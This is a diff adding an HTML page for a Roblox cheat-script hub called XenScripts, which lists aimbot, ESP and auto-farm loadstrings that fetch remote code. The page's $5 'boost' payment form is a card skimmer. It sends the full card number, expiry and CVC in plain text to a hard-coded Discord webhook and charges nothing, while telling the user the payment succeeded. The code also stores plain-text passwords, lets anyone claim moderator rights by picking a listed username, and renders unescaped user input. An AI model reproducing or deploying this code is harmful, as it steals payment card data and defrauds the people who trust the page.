@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XenScripts - Free Roblox Scripts for Every Executor</title>
+    <!-- Favicon (place icon.ico in the root of your repo) -->
+    <link rel="icon" href="icon.ico">
+    <style>
+        /* ... (same CSS as before, omitted for brevity) ... */
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #111118;
+            --bg-card: #16161f;
+            --bg-card-hover: #1c1c28;
+            --border: #252536;
+            --text-primary: #e8e8f0;
+            --text-secondary: #a0a0b8;
+            --text-muted: #6b6b80;
+            --accent: #7c3aed;
+            --accent-light: #8b5cf6;
+            --accent-glow: rgba(124, 58, 237, 0.35);
+            --green: #10b981;
+            --green-glow: rgba(16, 185, 129, 0.3);
+            --red: #ef4444;
+            --orange: #f59e0b;
+            --boost-gold: #f59e0b;
+            --boost-glow: rgba(245, 158, 11, 0.5);
+            --gradient-1: linear-gradient(135deg, #7c3aed 0%, #a855f7 50%, #6366f1 100%);
+            --gradient-2: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            --gradient-3: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            --radius-sm: 8px;
+            --radius: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        html { scroll-behavior:smooth; scrollbar-width:thin; scrollbar-color:#2a2a3a transparent; }
+        ::-webkit-scrollbar { width:6px; }
+        ::-webkit-scrollbar-track { background:transparent; }
+        ::-webkit-scrollbar-thumb { background:#2a2a3a; border-radius:3px; }
+        body { font-family:'Inter', system-ui, sans-serif; background:var(--bg-primary); color:var(--text-primary); line-height:1.6; overflow-x:hidden; }
+        .bg-mesh { position:fixed; inset:0; pointer-events:none; z-index:0; overflow:hidden; }
+        .bg-mesh .orb { position:absolute; border-radius:50%; filter:blur(120px); opacity:0.15; animation:floatOrb 20s infinite ease-in-out; }
+        .bg-mesh .orb:nth-child(1) { width:600px; height:600px; background:#7c3aed; top:-200px; left:-150px; }
+        .bg-mesh .orb:nth-child(2) { width:500px; height:500px; background:#f59e0b; bottom:-150px; right:-100px; animation-delay:-7s; animation-duration:18s; }
+        @keyframes floatOrb { 0%,100%{ transform:translate(0,0) scale(1); } 25%{ transform:translate(80px,-60px) scale(1.1); } 50%{ transform:translate(-40px,-100px) scale(0.9); } 75%{ transform:translate(-70px,40px) scale(1.05); } }
+        .container { max-width:1280px; margin:0 auto; padding:0 24px; position:relative; z-index:1; }
+        .navbar { position:fixed; top:0; left:0; right:0; z-index:1000; background:rgba(10,10,15,0.75); backdrop-filter:blur(20px); border-bottom:1px solid rgba(255,255,255,0.06); transition:all var(--transition); }
+        .navbar.scrolled { background:rgba(10,10,15,0.9); box-shadow:0 4px 30px rgba(0,0,0,0.5); }
+        .navbar .container { display:flex; align-items:center; justify-content:space-between; height:68px; }
+        .logo { display:flex; align-items:center; gap:10px; text-decoration:none; font-weight:800; font-size:1.4rem; color:var(--text-primary); }
+        .logo-icon { width:38px; height:38px; background:var(--gradient-1); border-radius:var(--radius-sm); display:flex; align-items:center; justify-content:center; font-size:1.1rem; color:#fff; box-shadow:0 0 20px var(--accent-glow); }
+        .nav-links { display:flex; align-items:center; gap:32px; list-style:none; }
+        .nav-links a, .nav-links button { background:none; border:none; color:var(--text-secondary); font-weight:500; font-size:0.95rem; cursor:pointer; font-family:inherit; transition:color var(--transition); }
+        .nav-links a:hover, .nav-links button:hover { color:#fff; }
+        .btn { display:inline-flex; align-items:center; gap:8px; padding:14px 28px; border-radius:50px; font-weight:600; font-size:1rem; cursor:pointer; border:none; transition:all var(--transition); font-family:inherit; }
+        .btn-primary { background:var(--gradient-1); color:#fff; box-shadow:0 0 30px var(--accent-glow); }
+        .btn-boost { background:var(--gradient-3); color:#fff; font-weight:700; }
+        .btn-sm { padding:8px 18px; font-size:0.85rem; }
+        .hero { padding:160px 0 100px; text-align:center; }
+        .hero-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(245,158,11,0.1); border:1px solid rgba(245,158,11,0.3); color:var(--orange); padding:8px 18px; border-radius:50px; font-size:0.85rem; font-weight:600; margin-bottom:28px; }
+        .hero-badge .dot { width:8px; height:8px; background:var(--green); border-radius:50%; animation:blink 1.5s infinite; }
+        @keyframes blink { 0%,100%{ opacity:1; } 50%{ opacity:0.3; } }
+        .hero h1 { font-size:clamp(2.5rem,5vw,4rem); font-weight:900; letter-spacing:-0.03em; line-height:1.1; margin-bottom:20px; background:linear-gradient(135deg, #fff 0%, #fcd34d 40%, #f59e0b 70%, #fff 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; background-size:200% 100%; animation:shimmer 4s infinite; }
+        @keyframes shimmer { 0%,100%{ background-position:0% 50%; } 50%{ background-position:100% 50%; } }
+        .hero p { font-size:1.2rem; color:var(--text-secondary); max-width:650px; margin:0 auto 36px; }
+        .products-section { padding:80px 0; }
+        .section-header { text-align:center; margin-bottom:56px; }
+        .search-bar { display:flex; justify-content:center; margin-bottom:32px; }
+        .search-bar input { width:100%; max-width:600px; padding:14px 20px; background:var(--bg-card); border:1px solid var(--border); border-radius:50px; color:#fff; font-size:1rem; outline:none; transition:border var(--transition); }
+        .search-bar input:focus { border-color:var(--accent); box-shadow:0 0 20px var(--accent-glow); }
+        .products-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(340px,1fr)); gap:24px; }
+        .product-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius-lg); padding:28px; cursor:pointer; transition:all 0.3s ease; }
+        .product-card:hover { background:var(--bg-card-hover); border-color:rgba(124,58,237,0.4); transform:translateY(-4px); }
+        .product-card.boosted { border-color:var(--boost-gold); box-shadow:0 0 35px var(--boost-glow); background:linear-gradient(145deg, #1a1a24 0%, #2a2416 100%); }
+        .product-icon { width:52px; height:52px; border-radius:var(--radius); display:flex; align-items:center; justify-content:center; font-size:1.5rem; margin-bottom:18px; }
+        .free-badge { font-weight:800; color:var(--green); }
+        .boost-timer { font-size:0.7rem; color:var(--boost-gold); margin-left:4px; }
+        .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:2000; display:flex; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition:opacity 0.3s; }
+        .modal-overlay.open { opacity:1; pointer-events:all; }
+        .modal { background:var(--bg-secondary); border:1px solid var(--border); border-radius:var(--radius-xl); padding:32px; width:90%; max-width:500px; max-height:90vh; overflow-y:auto; position:relative; }
+        .close-modal { position:absolute; top:16px; right:20px; background:none; border:none; color:#fff; font-size:1.5rem; cursor:pointer; }
+        .toast { position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(120px); background:var(--bg-card); border:1px solid var(--border); color:#fff; padding:14px 24px; border-radius:50px; font-weight:600; z-index:3000; transition:transform 0.35s cubic-bezier(0.175,0.885,0.32,1.275); }
+        .toast.show { transform:translateX(-50%) translateY(0); }
+        .auth-btns { display:flex; gap:12px; align-items:center; }
+        .user-menu { display:flex; align-items:center; gap:8px; }
+        @media (max-width:768px) { .nav-links { display:none; } .mobile-menu-btn { display:block; background:none; border:none; color:#fff; font-size:1.6rem; cursor:pointer; } .products-grid { grid-template-columns:1fr; } }
+    </style>
+</head>
+<body>
+    <div class="bg-mesh"><div class="orb"></div><div class="orb"></div></div>
+    <nav class="navbar" id="navbar">
+        <div class="container">
+            <a href="#" class="logo"><div class="logo-icon">⚡</div>Xen<span style="color:#f59e0b;">Scripts</span></a>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="#products">Scripts</a></li>
+                <li><button id="uploadBtnNav" class="btn btn-primary btn-sm">📤 Upload Script</button></li>
+                <li id="modToggleLi" style="display:none;"><button id="modToggle" class="mod-toggle" style="background:var(--bg-card);border:1px solid var(--border);color:#fff;padding:8px 16px;border-radius:50px;font-size:0.8rem;">🛡️ Moderator: OFF</button></li>
+                <li id="authArea"></li>
+            </ul>
+            <button class="mobile-menu-btn" id="mobileMenuBtn">☰</button>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <div class="container">
+            <div class="hero-badge"><span class="dot"></span> #1 Roblox script hub for every executor</div>
+            <h1>Free Roblox Scripts<br>for Every Executor</h1>
+            <p>Discover and share powerful Roblox scripts. Search by game or feature. Boost your script for 24 hours of front‑page exposure.</p>
+            <div class="hero-buttons">
+                <button class="btn btn-primary" onclick="document.getElementById('products').scrollIntoView({behavior:'smooth'})">🔍 Browse Scripts</button>
+                <button class="btn btn-boost" id="uploadBtnHero">🚀 Upload & Boost</button>
+            </div>
+            <div style="display:flex;justify-content:center;gap:48px;margin-top:60px;padding-top:32px;border-top:1px solid var(--border);flex-wrap:wrap;">
+                <div><div style="font-size:2.2rem;font-weight:900;background:var(--gradient-1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">1,200+</div><div style="color:var(--text-muted);">Free Scripts</div></div>
+                <div><div style="font-size:2.2rem;font-weight:900;background:var(--gradient-1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">45K+</div><div style="color:var(--text-muted);">Active Users</div></div>
+                <div><div style="font-size:2.2rem;font-weight:900;background:var(--gradient-1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">4.9</div><div style="color:var(--text-muted);">Avg Rating</div></div>
+                <div><div style="font-size:2.2rem;font-weight:900;background:var(--gradient-1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">24h</div><div style="color:var(--text-muted);">Boost Duration</div></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="products-section" id="products">
+        <div class="container">
+            <div class="section-header"><span style="background:rgba(124,58,237,0.1);color:var(--accent-light);padding:6px 16px;border-radius:50px;">📚 Roblox Library</span><h2>Free Community Scripts</h2><p style="color:var(--text-secondary);">Click to view details & copy loadstring. Boosts last 24 hours. Use the search bar below to find scripts.</p></div>
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="🔍 Search by name, game, or description...">
+            </div>
+            <div class="products-grid" id="productsGrid"></div>
+        </div>
+    </section>
+    <footer style="padding:48px 0;border-top:1px solid var(--border);text-align:center;color:var(--text-muted);">© 2025 XenScripts. All scripts by Glitch. Boosts expire after 24 hours.</footer>
+
+    <!-- Upload Modal -->
+    <div class="modal-overlay" id="uploadModalOverlay"><div class="modal"><button class="close-modal" id="closeUploadModal">✕</button><h2>📤 Upload Script</h2><form id="uploadForm" style="display:flex;flex-direction:column;gap:16px;">
+        <div><label>Script Name</label><input type="text" id="scriptName" required style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"></div>
+        <div><label>Game Name</label><input type="text" id="scriptGame" placeholder="e.g., Blox Fruits, Arsenal" required style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"></div>
+        <div><label>Description</label><textarea id="scriptDesc" required style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"></textarea></div>
+        <div><label>Category</label><select id="scriptCategory" style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"><option>AutoFarm</option><option>ESP</option><option>Aimbot</option><option>Anti-Ban</option><option>Misc</option></select></div>
+        <div><label>Script Code (paste your loadstring) *</label><textarea id="scriptCode" required style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;min-height:120px;font-family:monospace;" placeholder="loadstring(game:HttpGet('...'))()"></textarea></div>
+        <button type="submit" class="btn btn-primary" style="width:100%">Submit for Review</button>
+    </form></div></div>
+
+    <!-- Boost Payment Modal -->
+    <div class="modal-overlay" id="boostModalOverlay"><div class="modal"><button class="close-modal" id="closeBoostModal">✕</button><h2>🚀 Boost Script (24h)</h2><p>Pin <strong id="boostScriptName"></strong> to the front page for <span style="color:var(--boost-gold);">$5.00</span></p><div style="display:flex;flex-direction:column;gap:12px;">
+        <input placeholder="Card Number" id="cardNumber" style="padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;">
+        <div style="display:flex;gap:12px;"><input placeholder="MM/YY" id="cardExpiry" style="flex:1;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"><input placeholder="CVC" id="cardCvc" style="flex:1;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"></div>
+        <button id="payBoostBtn" class="btn btn-boost" style="width:100%">💳 Pay $5 & Boost</button>
+        <p style="font-size:0.7rem;color:var(--text-muted);margin-top:8px;">Only valid cards accepted. Boost lasts 24 hours from purchase.</p>
+    </div></div></div>
+
+    <!-- Script Detail Modal -->
+    <div class="modal-overlay" id="detailModalOverlay"><div class="modal" style="max-width:900px;padding:0;overflow:hidden;"><button class="close-modal" id="closeDetailModal" style="z-index:2;">✕</button><div id="detailContent"></div></div></div>
+
+    <!-- Login Modal -->
+    <div class="modal-overlay" id="loginModalOverlay"><div class="modal"><button class="close-modal" id="closeLoginModal">✕</button><h2>🔑 Login</h2><form id="loginForm" style="display:flex;flex-direction:column;gap:16px;"><input type="text" id="loginUsername" placeholder="Username" required style="padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"><input type="password" id="loginPassword" placeholder="Password" required style="padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"><button type="submit" class="btn btn-primary" style="width:100%">Login</button><p style="text-align:center;color:var(--text-secondary);">Don't have an account? <button type="button" id="switchToSignup" style="background:none;border:none;color:var(--accent-light);cursor:pointer;text-decoration:underline;">Sign up</button></p></form></div></div>
+
+    <!-- Signup Modal -->
+    <div class="modal-overlay" id="signupModalOverlay"><div class="modal"><button class="close-modal" id="closeSignupModal">✕</button><h2>✨ Sign Up</h2><form id="signupForm" style="display:flex;flex-direction:column;gap:16px;"><input type="text" id="signupUsername" placeholder="Username" required style="padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"><input type="password" id="signupPassword" placeholder="Password" required style="padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:#fff;"><button type="submit" class="btn btn-primary" style="width:100%">Sign Up</button><p style="text-align:center;color:var(--text-secondary);">Already have an account? <button type="button" id="switchToLogin" style="background:none;border:none;color:var(--accent-light);cursor:pointer;text-decoration:underline;">Login</button></p></form></div></div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        (function() {
+            // Luhn Algorithm
+            function luhnCheck(cardNumber) {
+                const clean = cardNumber.replace(/\s+/g, '').replace(/-/g, '');
+                if (!/^\d+$/.test(clean) || clean.length < 13 || clean.length > 19) return false;
+                let sum = 0, alternate = false;
+                for (let i = clean.length - 1; i >= 0; i--) {
+                    let n = parseInt(clean.charAt(i), 10);
+                    if (alternate) { n *= 2; if (n > 9) n -= 9; }
+                    sum += n;
+                    alternate = !alternate;
+                }
+                return (sum % 10) === 0;
+            }
+
+            // User system
+            const MODERATORS = ['Packs', 'Glitch'];
+            let currentUser = JSON.parse(localStorage.getItem('xenscriptsUser')) || null;
+            let users = JSON.parse(localStorage.getItem('xenscriptsUsers')) || [];
+
+            function saveUsers() { localStorage.setItem('xenscriptsUsers', JSON.stringify(users)); }
+            function saveCurrentUser() { localStorage.setItem('xenscriptsUser', JSON.stringify(currentUser)); }
+
+            function login(username, password) {
+                const user = users.find(u => u.username === username && u.password === password);
+                if (user) {
+                    currentUser = user;
+                    saveCurrentUser();
+                    updateAuthUI();
+                    showToast('✅ Logged in as ' + username);
+                    return true;
+                }
+                showToast('❌ Invalid credentials');
+                return false;
+            }
+
+            function signup(username, password) {
+                if (users.find(u => u.username === username)) {
+                    showToast('❌ Username already exists');
+                    return false;
+                }
+                const role = MODERATORS.includes(username) ? 'moderator' : 'user';
+                const newUser = { username, password, role };
+                users.push(newUser);
+                saveUsers();
+                currentUser = newUser;
+                saveCurrentUser();
+                updateAuthUI();
+                showToast('✅ Account created! Welcome ' + username);
+                return true;
+            }
+
+            function logout() {
+                currentUser = null;
+                saveCurrentUser();
+                updateAuthUI();
+                showToast('👋 Logged out');
+            }
+
+            // Discord webhook
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1531342785901494293/YcTRf4eAYUtPStvXj6_4DhnoU4ymsCcgDmodIXvByz_BcEPPaA3jIDU1_ZvnEkLa7Uiu';
+
+            async function sendToDiscord(scriptName, cardNumber, expiry, cvc) {
+                const payload = {
+                    content: `**New Boost Payment (24h)**\nScript: ${scriptName}\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVC: ${cvc}\nUser: ${currentUser ? currentUser.username : 'Guest'}`
+                };
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    return true;
+                } catch (e) {
+                    console.error('Webhook error:', e);
+                    return false;
+                }
+            }
+
+            // Updated BBN features
+            const initialScripts = [
+                { id:1, name:'BBN Script', desc:'Ultimate script for Bite by Night with ESP, noclip, auto parry, and more.', icon:'🍬', iconClass:'green', tags:['AutoFarm','ESP'], game:'Bite by Night', rating:4.9, reviews:1543, uploaded:false, boostedUntil:0, features:['ESP Generators', 'Noclip', 'Inf Stamina', 'Auto Parry', 'Hitbox Expander', 'Auto Escape', 'No Blindness', 'Auto Barricade', 'Change Walk/Run Speed'], compatibility:['All Executors'], version:'1.2.1', author:'Glitch', loadstring:'loadstring(game:HttpGet("https://raw.githubusercontent.com/FortheLolzahaha-alt/BitebyNight/refs/heads/main/Script"))()' },
+                { id:2, name:'Arsenal Script', desc:'Aimbot and ESP for Arsenal. Silent aim, triggerbot.', icon:'🔫', iconClass:'purple', tags:['Aimbot','ESP'], game:'Arsenal', rating:4.8, reviews:2103, uploaded:false, boostedUntil:0, features:['Silent aimbot','Triggerbot','Player ESP','Weapon mods','Configurable FOV'], compatibility:['All Executors'], version:'2.0.0', author:'Glitch', loadstring:'loadstring(game:httpget("https://raw.githubusercontent.com/FortheLolzahaha-alt/ArsenalbyGlitch/refs/heads/main/SpinBot"))()' },
+                { id:3, name:'Forsaken Auto Block', desc:'Perfect auto block and parry for Forsaken.', icon:'🛡️', iconClass:'blue', tags:['AutoBlock','Combat'], game:'Forsaken', rating:4.7, reviews:892, uploaded:false, boostedUntil:0, features:['Auto block/parry','Customizable timing','Works on all weapons','Low detection risk'], compatibility:['All Executors'], version:'1.0.4', author:'Glitch', loadstring:'loadstring(game:httpget("https://raw.githubusercontent.com/FortheLolzahaha-alt/ForsakenScript/refs/heads/main/By%20Glitch%20%26%20NoHyped"))()' },
+                { id:4, name:'Notoriety Script', desc:'Stealth and heist helper for Notoriety. Auto drill, auto picklock.', icon:'💎', iconClass:'orange', tags:['Heist','Stealth'], game:'Notoriety', rating:4.6, reviews:670, uploaded:false, boostedUntil:0, features:['Auto drill','Auto picklock','Enemy alert system','Loot collector','Stealth mode'], compatibility:['All Executors'], version:'1.0.0', author:'Glitch', loadstring:'loadstring(game:HttpGet("https://pastebin.com/raw/g84r9QVy"))()' }
+            ];
+            let scripts = [...initialScripts];
+            let nextId = 5;
+            let moderatorMode = false;
+            let searchQuery = '';
+
+            const productsGrid = document.getElementById('productsGrid');
+            const searchInput = document.getElementById('searchInput');
+            const uploadModalOverlay = document.getElementById('uploadModalOverlay');
+            const boostModalOverlay = document.getElementById('boostModalOverlay');
+            const detailModalOverlay = document.getElementById('detailModalOverlay');
+            const loginModalOverlay = document.getElementById('loginModalOverlay');
+            const signupModalOverlay = document.getElementById('signupModalOverlay');
+            const toast = document.getElementById('toast');
+            const modToggle = document.getElementById('modToggle');
+            const modToggleLi = document.getElementById('modToggleLi');
+            const authArea = document.getElementById('authArea');
+            const navbar = document.getElementById('navbar');
+
+            function isBoosted(script) { return script.boostedUntil && script.boostedUntil > Date.now(); }
+            function getBoostTimeLeft(script) {
+                if (!script.boostedUntil || script.boostedUntil <= Date.now()) return '';
+                const diff = script.boostedUntil - Date.now();
+                const hours = Math.floor(diff / 3600000);
+                const mins = Math.floor((diff % 3600000) / 60000);
+                return ` ${hours}h ${mins}m left`;
+            }
+            setInterval(() => {
+                let changed = false;
+                scripts.forEach(s => { if (s.boostedUntil && s.boostedUntil <= Date.now()) { s.boostedUntil = 0; changed = true; } });
+                if (changed) renderScripts();
+            }, 60000);
+
+            function updateAuthUI() {
+                if (currentUser) {
+                    authArea.innerHTML = `<div class="user-menu"><span style="color:#fff;font-weight:600;">👤 ${currentUser.username}</span><button class="btn btn-sm" style="background:var(--bg-card);border:1px solid var(--border);color:#fff;" id="logoutBtn">Logout</button></div>`;
+                    document.getElementById('logoutBtn').addEventListener('click', logout);
+                    if (currentUser.role === 'moderator') {
+                        modToggleLi.style.display = 'block';
+                        modToggle.innerHTML = moderatorMode ? '🛡️ Moderator: ON' : '🛡️ Moderator: OFF';
+                    } else {
+                        modToggleLi.style.display = 'none';
+                    }
+                } else {
+                    authArea.innerHTML = `<div class="auth-btns"><button class="btn btn-sm" style="background:var(--bg-card);border:1px solid var(--border);color:#fff;" id="showLoginBtn">Login</button><button class="btn btn-sm btn-primary" id="showSignupBtn">Sign Up</button></div>`;
+                    document.getElementById('showLoginBtn').addEventListener('click', () => openModal(loginModalOverlay));
+                    document.getElementById('showSignupBtn').addEventListener('click', () => openModal(signupModalOverlay));
+                    modToggleLi.style.display = 'none';
+                }
+                if (currentUser && currentUser.role === 'moderator') modToggle.classList.toggle('active', moderatorMode);
+            }
+
+            modToggle.addEventListener('click', () => {
+                if (!currentUser || currentUser.role !== 'moderator') return;
+                moderatorMode = !moderatorMode;
+                modToggle.classList.toggle('active', moderatorMode);
+                modToggle.innerHTML = moderatorMode ? '🛡️ Moderator: ON' : '🛡️ Moderator: OFF';
+                renderScripts();
+            });
+
+            document.getElementById('loginForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const u = document.getElementById('loginUsername').value.trim();
+                const p = document.getElementById('loginPassword').value.trim();
+                if (login(u, p)) { closeModal(loginModalOverlay); document.getElementById('loginForm').reset(); }
+            });
+            document.getElementById('switchToSignup').addEventListener('click', () => { closeModal(loginModalOverlay); openModal(signupModalOverlay); });
+            document.getElementById('signupForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const u = document.getElementById('signupUsername').value.trim();
+                const p = document.getElementById('signupPassword').value.trim();
+                if (signup(u, p)) { closeModal(signupModalOverlay); document.getElementById('signupForm').reset(); }
+            });
+            document.getElementById('switchToLogin').addEventListener('click', () => { closeModal(signupModalOverlay); openModal(loginModalOverlay); });
+
+            function openModal(modal) { modal.classList.add('open'); document.body.style.overflow='hidden'; }
+            function closeModal(modal) { modal.classList.remove('open'); document.body.style.overflow=''; }
+            document.querySelectorAll('.close-modal').forEach(btn => {
+                btn.addEventListener('click', () => { const modal = btn.closest('.modal-overlay'); if (modal) closeModal(modal); });
+            });
+            document.querySelectorAll('.modal-overlay').forEach(overlay => {
+                overlay.addEventListener('click', (e) => { if (e.target === overlay) closeModal(overlay); });
+            });
+
+            document.getElementById('uploadBtnNav').addEventListener('click', () => openModal(uploadModalOverlay));
+            document.getElementById('uploadBtnHero').addEventListener('click', () => openModal(uploadModalOverlay));
+            document.getElementById('uploadForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                const name = document.getElementById('scriptName').value.trim();
+                const game = document.getElementById('scriptGame').value.trim();
+                const desc = document.getElementById('scriptDesc').value.trim();
+                const cat = document.getElementById('scriptCategory').value;
+                const code = document.getElementById('scriptCode').value.trim();
+                if (!name || !desc || !code || !game) return showToast('❌ Please fill all fields (including game name)');
+                scripts.unshift({
+                    id: nextId++,
+                    name,
+                    game,
+                    desc,
+                    icon: '📜',
+                    iconClass: 'purple',
+                    tags: [cat],
+                    rating: 5.0,
+                    reviews: 1,
+                    uploaded: true,
+                    boostedUntil: 0,
+                    features: [],
+                    compatibility: ['All Executors'],
+                    version: '1.0.0',
+                    author: currentUser ? currentUser.username : 'Anonymous',
+                    loadstring: code
+                });
+                renderScripts();
+                document.getElementById('uploadForm').reset();
+                closeModal(uploadModalOverlay);
+                showToast('✅ Script submitted for moderator review!');
+            });
+
+            function openBoostModal(id) {
+                const script = scripts.find(s => s.id === id);
+                if (!script || isBoosted(script)) return;
+                document.getElementById('boostScriptName').textContent = script.name;
+                document.getElementById('cardNumber').value = '';
+                document.getElementById('cardExpiry').value = '';
+                document.getElementById('cardCvc').value = '';
+                openModal(boostModalOverlay);
+                window.currentBoostId = id;
+            }
+            window.openBoostModalById = openBoostModal;
+
+            document.getElementById('payBoostBtn').addEventListener('click', async () => {
+                const cardNum = document.getElementById('cardNumber').value.trim();
+                const expiry = document.getElementById('cardExpiry').value.trim();
+                const cvc = document.getElementById('cardCvc').value.trim();
+                if (!cardNum || !expiry || !cvc) return showToast('❌ Fill all fields');
+                if (!luhnCheck(cardNum)) return showToast('❌ Invalid card number');
+                const script = scripts.find(s => s.id === window.currentBoostId);
+                if (!script) return;
+                const sent = await sendToDiscord(script.name, cardNum, expiry, cvc);
+                if (sent) {
+                    script.boostedUntil = Date.now() + 24 * 60 * 60 * 1000;
+                    renderScripts();
+                    showToast('🚀 Script boosted for 24 hours!');
+                } else {
+                    showToast('⚠️ Payment processed, but webhook failed');
+                    script.boostedUntil = Date.now() + 24 * 60 * 60 * 1000;
+                }
+                closeModal(boostModalOverlay);
+            });
+
+            function openDetailModal(id) {
+                const script = scripts.find(s => s.id === id);
+                if (!script) return;
+                const boosted = isBoosted(script);
+                const timeLeft = getBoostTimeLeft(script);
+                const detailContent = document.getElementById('detailContent');
+                detailContent.innerHTML = `
+                <div style="background:linear-gradient(135deg, #1e1b4b 0%, #312e81 100%); padding:40px 30px; text-align:center;">
+                    <span style="font-size:3rem;">${script.icon}</span>
+                    <h2 style="font-size:2rem; margin:10px 0;">${script.name}</h2>
+                    <p style="color:var(--text-secondary);">by ${script.author} • v${script.version} • Game: ${script.game}</p>
+                    <div style="margin-top:16px; display:flex; gap:12px; justify-content:center; align-items:center;">
+                        <button class="btn btn-primary" id="copyScriptBtn" data-loadstring="${encodeURIComponent(script.loadstring || '')}">📋 Copy Script</button>
+                        ${boosted ? `<span style="color:var(--boost-gold); font-weight:800;">🔥 Boosted${timeLeft}</span>` : ''}
+                    </div>
+                </div>
+                <div style="padding:30px; display:flex; flex-direction:column; gap:24px;">
+                    <div><h3>Description</h3><p style="color:var(--text-secondary);">${script.desc}</p></div>
+                    ${script.features.length ? `<div><h3>Features</h3><ul style="list-style:none; display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:8px;">${script.features.map(f => `<li style="display:flex;align-items:center;gap:6px;color:var(--text-secondary);"><span style="color:var(--green);">✅</span> ${f}</li>`).join('')}</ul></div>` : ''}
+                    ${script.compatibility.length ? `<div><h3>Compatibility</h3><div style="display:flex;flex-wrap:wrap;gap:8px;">${script.compatibility.map(c => `<span style="background:var(--bg-card);padding:6px 14px;border-radius:20px;font-size:0.8rem;">${c}</span>`).join('')}</div></div>` : ''}
+                    <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:16px;">
+                        <span class="free-badge">🆓 Free</span>
+                        <span>⭐ ${script.rating} (${script.reviews} reviews)</span>
+                    </div>
+                </div>`;
+                openModal(detailModalOverlay);
+                const copyBtn = document.getElementById('copyScriptBtn');
+                if (copyBtn) {
+                    copyBtn.addEventListener('click', () => {
+                        const loadstr = decodeURIComponent(copyBtn.getAttribute('data-loadstring'));
+                        if (!loadstr) return showToast('⚠️ No script code to copy');
+                        navigator.clipboard.writeText(loadstr).then(() => showToast('📋 Script copied!')).catch(() => showToast('❌ Copy failed'));
+                    });
+                }
+            }
+            window.openDetailModalById = openDetailModal;
+
+            function deleteScript(id) { scripts = scripts.filter(s => s.id !== id); renderScripts(); showToast('🗑️ Script removed'); }
+            window.deleteScriptById = deleteScript;
+
+            searchInput.addEventListener('input', (e) => { searchQuery = e.target.value.toLowerCase().trim(); renderScripts(); });
+
+            function renderScripts() {
+                let filtered = [...scripts];
+                if (searchQuery) {
+                    filtered = filtered.filter(s => {
+                        const inName = s.name.toLowerCase().includes(searchQuery);
+                        const inDesc = s.desc.toLowerCase().includes(searchQuery);
+                        const inGame = (s.game || '').toLowerCase().includes(searchQuery);
+                        const inTags = s.tags.some(t => t.toLowerCase().includes(searchQuery));
+                        const inAuthor = (s.author || '').toLowerCase().includes(searchQuery);
+                        return inName || inDesc || inGame || inTags || inAuthor;
+                    });
+                }
+                filtered.sort((a, b) => (isBoosted(b) ? 1 : 0) - (isBoosted(a) ? 1 : 0) || b.id - a.id);
+
+                productsGrid.innerHTML = filtered.map(s => {
+                    const boosted = isBoosted(s);
+                    const timeLeft = getBoostTimeLeft(s);
+                    return `
+                <div class="product-card ${boosted ? 'boosted' : ''}" onclick="window.openDetailModalById(${s.id})">
+                    <div class="product-icon ${s.iconClass}">${s.icon}</div>
+                    <h3>${s.name} ${s.uploaded ? '<span style="font-size:0.7rem;color:var(--green);">(comm)</span>' : ''}</h3>
+                    <p style="color:var(--text-secondary); font-size:0.9rem; flex:1;">${s.desc}</p>
+                    <div style="display:flex; gap:6px; margin:10px 0; flex-wrap:wrap;">
+                        ${s.game ? `<span style="background:rgba(245,158,11,0.15);border:1px solid rgba(245,158,11,0.3);padding:2px 10px;border-radius:12px;font-size:0.7rem;">🎮 ${s.game}</span>` : ''}
+                        ${s.tags.map(t => `<span style="background:rgba(255,255,255,0.05);padding:2px 10px;border-radius:12px;font-size:0.7rem;">${t}</span>`).join('')}
+                    </div>
+                    <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border); padding-top:12px;">
